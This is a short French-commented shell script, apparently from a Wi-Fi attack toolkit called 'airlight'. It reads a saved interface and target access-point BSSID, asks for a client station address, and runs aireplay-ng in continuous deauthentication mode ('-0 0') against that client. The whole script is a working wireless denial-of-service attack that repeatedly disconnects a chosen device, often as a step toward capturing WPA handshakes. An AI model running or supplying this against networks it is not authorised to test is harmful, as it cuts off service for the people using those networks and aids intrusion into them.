#!/bin/sh

sudo echo ""
interface=$(cat /home/$USER/scripts/airlight/logs/interface.txt)
bssid=$(cat /home/$USER/scripts/airlight/logs/bssid.txt)
read -p "Station : " station
echo $station > /home/$USER/scripts/airlight/logs/station.txt
read -p "Appuyez sur une touche pour continuer." xd
echo "\033[33m$ aireplay-ng -0 0 -a $bssid -c $station --ignore-negative-one $interface\033[0m"
sudo aireplay-ng -0 0 -a $bssid -c $station --ignore-negative-one $interface


